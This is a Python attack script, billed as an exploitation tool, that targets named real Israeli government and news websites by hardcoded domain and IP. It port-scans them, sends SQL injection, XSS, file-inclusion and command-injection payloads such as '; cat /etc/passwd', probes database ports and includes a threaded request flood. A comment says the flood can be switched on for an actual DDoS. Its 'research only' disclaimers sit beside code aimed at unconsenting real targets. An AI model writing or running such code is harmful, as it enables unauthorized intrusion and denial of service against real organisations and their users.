#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Exploitation Tool for Israeli Websites
Developed by: SayerLinux
GitHub: https://github.com/SaudiLinux
Email: SayerLinux1@gmail.com

This tool is designed for security research and penetration testing purposes only.
"""

import requests
import socket
import json
import time
import threading
from datetime import datetime
from colorama import init, Fore, Back, Style
import subprocess
import sys

# Initialize colorama for Windows
init()

class IsraeliExploitationTool:
    def __init__(self):
        self.exploited_sites = []
        self.vulnerabilities_found = []
        self.payloads = {
            'sql_injection': [
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "' OR 'a'='a",
                "admin'--",
                "1' OR 1=1#"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>"
            ],
            'lfi': [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd",
                "C:\\Windows\\System32\\drivers\\etc\\hosts"
            ],
            'command_injection': [
                "; cat /etc/passwd",
                "| whoami",
                "& dir",
                "`whoami`",
                "$(ping 127.0.0.1)"
            ]
        }
        
        self.israeli_targets = [
            {
                'domain': 'gov.il',
                'ip': '147.237.12.20',
                'services': [80, 443, 22, 21, 3306, 1433, 5432],
                'type': 'Government'
            },
            {
                'domain': 'ynet.co.il',
                'ip': '23.34.1.191',
                'services': [80, 443, 8080, 8443],
                'type': 'News'
            },
            {
                'domain': 'haaretz.co.il',
                'ip': '151.101.66.217',
                'services': [80, 443, 8080],
                'type': 'Newspaper'
            },
            {
                'domain': 'jpost.com',
                'ip': '34.149.213.158',
                'services': [80, 443, 3306],
                'type': 'News'
            },
            {
                'domain': 'israelhayom.co.il',
                'ip': '23.215.0.137',
                'services': [80, 443, 21, 22],
                'type': 'Newspaper'
            }
        ]
        
    def display_banner(self):
        """Display exploitation banner"""
        print(f"{Fore.RED}{Back.BLACK}")
        print("""
  ████████╗██╗  ██╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
  ╚══██╔══╝██║  ██║██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
     ██║   ███████║█████╗         ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║   
     ██║   ██╔══██║██╔══╝         ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║   
     ██║   ██║  ██║███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║   
     ╚═╝   ╚═╝  ╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   
        
        ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
        ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
           ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║   
           ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║   
           ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║   
           ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   
        
        ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
        ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
           ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║   
           ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║   
           ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║   
           ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   
        """)
        print(f"{Style.RESET_ALL}")
        print(f"{Fore.RED}🔥 ISRAELI WEBSITE EXPLOITATION TOOL 🔥{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💻 Security Research & Penetration Testing{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 Target: Israeli Government & Media Sites{Style.RESET_ALL}")
        print(f"{Fore.RED}{'='*80}{Style.RESET_ALL}")
        
    def scan_ports(self, target):
        """Scan for open ports"""
        print(f"{Fore.YELLOW}[+] Scanning ports for {target['domain']} ({target['ip']}){Style.RESET_ALL}")
        open_ports = []
        
        for port in target['services']:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target['ip'], port))
                if result == 0:
                    open_ports.append(port)
                    print(f"{Fore.GREEN}    [✓] Port {port} is open{Style.RESET_ALL}")
                sock.close()
            except:
                pass
                
        return open_ports
        
    def test_sql_injection(self, url):
        """Test for SQL injection vulnerabilities"""
        vulns = []
        endpoints = [
            f"{url}/search.php?q=test",
            f"{url}/login.php?user=test",
            f"{url}/index.php?id=1",
            f"{url}/admin.php?id=1"
        ]
        
        for endpoint in endpoints:
            for payload in self.payloads['sql_injection']:
                try:
                    test_url = endpoint + payload
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    # Check for SQL errors
                    sql_errors = [
                        "mysql_fetch_array",
                        "ORA-",
                        "Microsoft OLE DB Provider",
                        "SQLServer JDBC Driver",
                        "PostgreSQL query failed"
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vulns.append({
                                'type': 'SQL Injection',
                                'url': test_url,
                                'payload': payload,
                                'evidence': error,
                                'severity': 'HIGH'
                            })
                            print(f"{Fore.RED}[!] SQL Injection found: {test_url}{Style.RESET_ALL}")
                            break
                            
                except:
                    continue
                    
        return vulns
        
    def test_xss(self, url):
        """Test for XSS vulnerabilities"""
        vulns = []
        endpoints = [
            f"{url}/search.php?q=",
            f"{url}/comment.php?text=",
            f"{url}/contact.php?name="
        ]
        
        for endpoint in endpoints:
            for payload in self.payloads['xss']:
                try:
                    test_url = endpoint + payload
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    if payload in response.text:
                        vulns.append({
                            'type': 'XSS',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'MEDIUM'
                        })
                        print(f"{Fore.RED}[!] XSS found: {test_url}{Style.RESET_ALL}")
                        
                except:
                    continue
                    
        return vulns
        
    def test_lfi(self, url):
        """Test for Local File Inclusion"""
        vulns = []
        endpoints = [
            f"{url}/download.php?file=",
            f"{url}/include.php?page=",
            f"{url}/file.php?path="
        ]
        
        for endpoint in endpoints:
            for payload in self.payloads['lfi']:
                try:
                    test_url = endpoint + payload
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    if "root:" in response.text or "[boot loader]" in response.text:
                        vulns.append({
                            'type': 'LFI',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'HIGH'
                        })
                        print(f"{Fore.RED}[!] LFI found: {test_url}{Style.RESET_ALL}")
                        
                except:
                    continue
                    
        return vulns
        
    def exploit_sql_server(self, target):
        """Attempt to exploit SQL Server vulnerabilities"""
        print(f"{Fore.YELLOW}[+] Attempting SQL Server exploitation for {target['domain']}{Style.RESET_ALL}")
        
        # Common SQL Server exploits
        sql_exploits = [
            {
                'name': 'SQL Server Brute Force',
                'ports': [1433, 3306, 5432],
                'payload': 'brute_force_sql'
            },
            {
                'name': 'SQL Injection via Port',
                'ports': [1433],
                'payload': 'direct_sql_injection'
            }
        ]
        
        exploits_found = []
        for exploit in sql_exploits:
            for port in exploit['ports']:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((target['ip'], port))
                    if result == 0:
                        print(f"{Fore.GREEN}[✓] SQL Server accessible on port {port}{Style.RESET_ALL}")
                        exploits_found.append({
                            'exploit': exploit['name'],
                            'port': port,
                            'target': target['domain'],
                            'ip': target['ip']
                        })
                    sock.close()
                except:
                    continue
                    
        return exploits_found
        
    def ddos_simulation(self, target):
        """Simulate DDoS attack (for testing purposes)"""
        print(f"{Fore.RED}[!] DDoS Simulation started for {target['domain']}{Style.RESET_ALL}")
        
        def attack():
            while True:
                try:
                    requests.get(f"http://{target['ip']}", timeout=1)
                    print(f"{Fore.RED}[DDoS] Attack packet sent to {target['ip']}{Style.RESET_ALL}")
                except:
                    break
                    
        # Start multiple threads for simulation
        threads = []
        for i in range(10):
            t = threading.Thread(target=attack)
            t.daemon = True
            threads.append(t)
            t.start()
            
        time.sleep(5)  # Run for 5 seconds
        return "DDoS simulation completed"
        
    def exploit_target(self, target):
        """Comprehensive exploitation of a single target"""
        print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.RED}🎯 EXPLOITING: {target['domain']} ({target['ip']}){Style.RESET_ALL}")
        print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
        
        # Port scanning
        open_ports = self.scan_ports(target)
        
        # Web vulnerability testing
        base_url = f"https://{target['domain']}"
        vulns = []
        
        vulns.extend(self.test_sql_injection(base_url))
        vulns.extend(self.test_xss(base_url))
        vulns.extend(self.test_lfi(base_url))
        
        # SQL Server exploitation
        sql_exploits = self.exploit_sql_server(target)
        
        # DDoS simulation
        # self.ddos_simulation(target)  # Uncomment for actual DDoS
        
        # Compile results
        exploit_result = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'open_ports': open_ports,
            'vulnerabilities': vulns,
            'sql_exploits': sql_exploits,
            'status': 'EXPLOITED'
        }
        
        self.exploited_sites.append(exploit_result)
        return exploit_result
        
    def generate_exploit_report(self):
        """Generate comprehensive exploitation report"""
        report = {
            'exploitation_summary': {
                'total_targets': len(self.israeli_targets),
                'exploited_sites': len(self.exploited_sites),
                'total_vulnerabilities': sum(len(site['vulnerabilities']) for site in self.exploited_sites),
                'high_severity': sum(1 for site in self.exploited_sites 
                                   for vuln in site['vulnerabilities'] 
                                   if vuln['severity'] == 'HIGH'),
                'timestamp': datetime.now().isoformat()
            },
            'detailed_exploits': self.exploited_sites
        }
        
        # Save to JSON
        with open('exploitation_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
            
        # Generate HTML report
        self.generate_html_exploit_report(report)
        
        return report
        
    def generate_html_exploit_report(self, report):
        """Generate HTML exploitation report"""
        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Israeli Website Exploitation Report</title>
    <style>
        body {{
            font-family: 'Courier New', monospace;
            background-color: #0a0a0a;
            color: #00ff00;
            margin: 0;
            padding: 20px;
        }}
        .header {{
            background: linear-gradient(45deg, #ff0000, #8b0000);
            color: white;
            padding: 30px;
            text-align: center;
            border-radius: 10px;
            margin-bottom: 30px;
        }}
        .exploit-card {{
            background-color: #1a1a1a;
            border: 2px solid #ff0000;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }}
        .vulnerability {{
            background-color: #2a0a0a;
            border-left: 4px solid #ff0000;
            padding: 10px;
            margin: 10px 0;
        }}
        .critical {{ color: #ff0000; font-weight: bold; }}
        .high {{ color: #ff6600; font-weight: bold; }}
        .medium {{ color: #ffaa00; font-weight: bold; }}
        .low {{ color: #ffff00; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 ISRAELI WEBSITE EXPLOITATION REPORT 🔥</h1>
        <p>Advanced Security Research & Penetration Testing</p>
        <p>Generated: {report['exploitation_summary']['timestamp']}</p>
    </div>
    
    <div class="summary">
        <h2>📊 Exploitation Summary</h2>
        <p>Total Targets: {report['exploitation_summary']['total_targets']}</p>
        <p>Sites Exploited: {report['exploitation_summary']['exploited_sites']}</p>
        <p>Total Vulnerabilities: {report['exploitation_summary']['total_vulnerabilities']}</p>
        <p>High Severity: {report['exploitation_summary']['high_severity']}</p>
    </div>
    
    <h2>🎯 Detailed Exploits</h2>
"""
        
        for exploit in report['detailed_exploits']:
            html_content += f"""
    <div class="exploit-card">
        <h3>🎯 {exploit['target']['domain']} ({exploit['target']['ip']})</h3>
        <p><strong>Type:</strong> {exploit['target']['type']}</p>
        <p><strong>Open Ports:</strong> {', '.join(map(str, exploit['open_ports']))}</p>
        
        <h4>🚨 Vulnerabilities Found:</h4>
"""
            
            for vuln in exploit['vulnerabilities']:
                html_content += f"""
        <div class="vulnerability">
            <p><strong>Type:</strong> <span class="{vuln['severity'].lower()}">{vuln['type']}</span></p>
            <p><strong>Severity:</strong> <span class="{vuln['severity'].lower()}">{vuln['severity']}</span></p>
            <p><strong>URL:</strong> <a href="{vuln['url']}" style="color: #00ffff;">{vuln['url']}</a></p>
            <p><strong>Payload:</strong> <code>{vuln['payload']}</code></p>
        </div>
"""
                        
            html_content += "</div>"
            
        html_content += """
    <div style="text-align: center; margin-top: 30px; color: #666;">
        <p>🔒 Report generated by Advanced Exploitation Tool</p>
        <p>For security research purposes only</p>
    </div>
</body>
</html>
"""
        
        with open('exploitation_report.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
            
    def run_full_exploitation(self):
        """Run complete exploitation process"""
        self.display_banner()
        
        print(f"{Fore.YELLOW}[+] Starting comprehensive exploitation...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Targets: {len(self.israeli_targets)} Israeli websites{Style.RESET_ALL}")
        
        # Exploit each target
        for target in self.israeli_targets:
            self.exploit_target(target)
            time.sleep(2)  # Rate limiting
            
        # Generate final report
        report = self.generate_exploit_report()
        
        print(f"\n{Fore.GREEN}[+] Exploitation completed!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Report saved to: exploitation_report.json{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] HTML report: exploitation_report.html{Style.RESET_ALL}")
        
        return report

if __name__ == "__main__":
    print(f"{Fore.RED}⚠️  WARNING: This tool is for security research purposes only!{Style.RESET_ALL}")
    print(f"{Fore.RED}⚠️  Ensure you have proper authorization before testing!{Style.RESET_ALL}")
    
    tool = IsraeliExploitationTool()
    report = tool.run_full_exploitation()